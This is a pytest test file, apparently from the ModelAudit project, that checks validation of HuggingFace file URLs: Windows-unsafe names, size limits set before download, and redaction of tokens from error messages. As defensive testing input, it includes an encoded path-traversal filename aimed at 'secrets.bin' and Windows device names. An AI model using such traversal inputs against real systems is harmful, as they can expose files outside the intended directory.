    def test_parse_file_url_rejects_windows_unsafe_filename_components(
        self,
        filename: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Windows device, drive, alias, and alternate-stream names must fail closed."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)
        url = f"https://huggingface.co/test/model/resolve/main/{filename}"

        with pytest.raises(ValueError, match="on Windows"):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    def test_parse_file_url_preserves_posix_colon_filename(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Windows-only path restrictions should not reject a valid POSIX filename."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", False)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/main/model.bin%3Astream") == (
            "test/model",
            "main",
            "model.bin:stream",
        )

    def test_parse_file_url_preserves_posix_backslash_filename(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A backslash is a literal POSIX filename character, not a path separator."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", False)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/main/dir%5Cweights.bin") == (
            "test/model",
            "main",
            "dir\\weights.bin",
        )

    def test_parse_file_url_preserves_posix_colon_revision(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Windows-only cache path restrictions should not reject a POSIX revision."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", False)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/release%3A1/model.bin") == (
            "test/model",
            "release:1",
            "model.bin",
        )

    @pytest.mark.parametrize(
        "revision",
        [
            "C%3A",
            "NUL",
            "refs%2FNUL%2F1",
            "refs%2FCOM%C2%B3%2F1",
            "branch.",
            "branch%20",
            "branch%3Fname",
        ],
    )
    def test_parse_file_url_rejects_windows_unsafe_revision_components(
        self,
        revision: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Revisions become SDK cache paths and must be Windows-safe component by component."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)
        url = f"https://huggingface.co/test/model/resolve/{revision}/model.bin"

        with pytest.raises(ValueError, match="on Windows"):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    def test_parse_file_url_allows_windows_safe_slash_revision(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Valid PR refs remain supported when each cache-path component is safe."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)

        assert parse_huggingface_file_url("https://huggingface.co/test/model/resolve/refs%2Fpr%2F1/model.bin") == (
            "test/model",
            "refs/pr/1",
            "model.bin",
        )

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_rejects_windows_unsafe_revision_before_sdk(
        self,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unsafe revision cache paths must fail before any SDK download."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface_paths._IS_WINDOWS", True)

        with pytest.raises(ValueError, match="revision path component on Windows"):
            download_file_from_hf("https://huggingface.co/test/model/resolve/C%3A/model.bin")

        mock_hf_hub_download.assert_not_called()

    def test_parse_file_url_accepts_default_https_port(self) -> None:
        """An explicit default transport port should preserve the same repository locator."""
        assert parse_huggingface_file_url("https://huggingface.co:443/test/model/resolve/main/model.bin") == (
            "test/model",
            "main",
            "model.bin",
        )

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_rejects_unsafe_direct_url_before_sdk_download(
        self,
        mock_hf_hub_download: MagicMock,
    ) -> None:
        """Unsafe decoded filename components should fail before the SDK download path."""
        with pytest.raises(ValueError, match="Invalid HuggingFace filename path component"):
            download_file_from_hf("https://huggingface.co/test/model/resolve/main/%2e%2e%2Fsecrets.bin")

        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize(
        "url",
        [
            f"https://huggingface.co/{'a' * 48}/{'b' * 48}/resolve/main/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%FF.bin",
            "https://huggingface.co/test/model/resolve/main/model\n.bin",
        ],
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_rejects_sdk_invalid_direct_url_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        url: str,
    ) -> None:
        """Repository, encoding, and raw URL validation must complete before the SDK call."""
        with pytest.raises(ValueError):
            download_file_from_hf(url)

        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_success(self, mock_hf_hub_download: MagicMock) -> None:
        """Test successful file download from HuggingFace."""
        mock_path = "/tmp/downloaded_file.bin"
        mock_hf_hub_download.return_value = mock_path

        url = "https://huggingface.co/test/model/resolve/main/pytorch_model.bin"
        result = download_file_from_hf(url)

        # Verify the download was called correctly
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision="main",
            cache_dir=None,
        )
        assert result == Path(mock_path)

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_allows_encoded_slash_revision(self, mock_hf_hub_download: MagicMock) -> None:
        """Legitimate PR refs should reach the SDK as decoded slash-containing revisions."""
        mock_hf_hub_download.return_value = "/tmp/downloaded_file.bin"

        result = download_file_from_hf(
            "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/model.bin",
        )

        mock_hf_hub_download.assert_called_once_with(
            repo_id="user/repo",
            filename="model.bin",
            revision="refs/pr/1",
            cache_dir=None,
        )
        assert result == Path("/tmp/downloaded_file.bin")

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_cache_dir(self, mock_hf_hub_download: MagicMock, tmp_path: Path) -> None:
        """Test file download with custom cache directory."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        cache_dir = tmp_path / "custom_cache"
        url = "https://huggingface.co/test/model/resolve/main/config.json"
        download_file_from_hf(url, cache_dir=cache_dir)

        # Verify cache directory was used
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="config.json",
            revision="main",
            cache_dir=str(cache_dir),
        )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_preflights_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Direct file downloads should allow files exactly at the capped boundary."""
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"x" * 1024)
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=TEST_COMMIT_SHA)
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=1024)]

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/model.bin",
            max_size=1024,
        )

        mock_hf_api.return_value.repo_info.assert_called_once_with("test/model", revision="main")
        mock_hf_api.return_value.get_paths_info.assert_called_once_with(
            "test/model",
            "model.bin",
            revision=TEST_COMMIT_SHA,
        )
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model.bin",
            revision=TEST_COMMIT_SHA,
            cache_dir=None,
        )
        assert result == downloaded_file

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_oversized_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Oversized direct files should not reach hf_hub_download."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=TEST_COMMIT_SHA)
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=11 * 1024 * 1024)]

        with pytest.raises(Exception, match="exceeds maximum allowed size") as exc_info:
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        assert "11.0 MB" in str(exc_info.value)
        assert "10.0 MB" in str(exc_info.value)
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    @pytest.mark.parametrize("file_size", [None, -1, "1024", True])
    def test_download_file_with_max_size_rejects_invalid_size_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        file_size: object,
    ) -> None:
        """Capped direct files fail closed when HuggingFace metadata has no valid size."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=TEST_COMMIT_SHA)
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=file_size)]

        with pytest.raises(Exception, match="Unable to determine file size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_underreported_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped direct files should verify the returned cache file before scanning."""
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"oversized")
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=TEST_COMMIT_SHA)
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=4)]

        with pytest.raises(Exception, match=r"Downloaded file size .* exceeds maximum allowed size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=4,
            )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_unverifiable_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped direct files fail closed if the downloaded cache path cannot be verified."""
        mock_hf_hub_download.return_value = str(tmp_path / "missing.bin")
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=TEST_COMMIT_SHA)
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=4)]

        with pytest.raises(Exception, match="Unable to verify downloaded file size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=4,
            )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_redacts_metadata_errors(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Metadata preflight errors should not expose direct URL credentials."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=TEST_COMMIT_SHA)
        mock_hf_api.return_value.get_paths_info.side_effect = Exception(
            "HEAD failed for https://huggingface.co/test/model/resolve/main/model.bin?token=hf_secret"
        )

        with pytest.raises(Exception, match="Failed to download file from") as exc_info:
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin?token=hf_secret",
                max_size=10 * 1024 * 1024,
            )

        error = str(exc_info.value)
        assert "hf_secret" not in error
        assert "token=" not in error
        assert "https://huggingface.co/test/model/resolve/main/model.bin" in error
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_missing_immutable_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Capped downloads fail closed instead of sizing and fetching a mutable branch."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=None)

        with pytest.raises(Exception, match="Unable to determine immutable revision"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        mock_hf_api.return_value.get_paths_info.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_without_max_size_skips_metadata_preflight(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Uncapped direct file downloads keep existing behavior and skip metadata lookup."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        result = download_file_from_hf("https://huggingface.co/test/model/resolve/main/model.bin")

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_called_once()
        assert result == Path(mock_path)

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_zero_max_size_skips_metadata_preflight(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero maximum size should preserve ModelAudit's unlimited-size behavior."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/model.bin",
            max_size=0,
        )

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_called_once()
        assert result == Path(mock_path)

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_negative_max_size_rejected(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Negative direct-download limits should not silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum file size must be non-negative"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=-1,
            )

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_failure(self, mock_hf_hub_download):
        """Test that file download failures are handled properly."""
        mock_hf_hub_download.side_effect = Exception(
            "Download failed for https://huggingface.co/test/model/resolve/main/file.bin?token=hf_secret"
        )

        url = "https://huggingface.co/test/model/resolve/main/file.bin?token=hf_secret"
        with pytest.raises(Exception, match="Failed to download file from") as exc_info:
            download_file_from_hf(url)

        error = str(exc_info.value)
        assert "hf_secret" not in error
        assert "token=" not in error
        assert "https://huggingface.co/test/model/resolve/main/file.bin" in error

    def test_download_file_invalid_url(self):
        """Test that invalid file URLs raise appropriate errors."""
        with pytest.raises(ValueError):
            download_file_from_hf("https://github.com/user/repo/blob/main/file.bin")

    def test_download_file_missing_dependency(self):
        """Test error when huggingface-hub is not installed."""
        real_import = __import__
        with patch("builtins.__import__") as mock_import:

            def side_effect(name, *args, **kwargs):
                if name == "huggingface_hub":
                    raise ImportError("No module named 'huggingface_hub'")
                return real_import(name, *args, **kwargs)

            mock_import.side_effect = side_effect
            with pytest.raises(ImportError, match="huggingface-hub package is required"):
                download_file_from_hf("https://huggingface.co/test/model/resolve/main/file.bin")
